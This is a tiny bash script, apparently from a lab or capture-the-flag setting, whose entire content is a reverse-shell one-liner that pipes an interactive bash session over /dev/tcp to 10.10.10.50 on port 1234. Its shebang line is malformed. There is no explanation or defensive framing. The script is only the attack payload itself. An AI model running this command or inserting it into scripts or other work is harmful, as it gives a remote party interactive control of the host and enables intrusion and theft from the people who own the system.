#/bin/bash

bash -c 'exec bash -i &>/dev/tcp/10.10.10.50/1234 <&1'
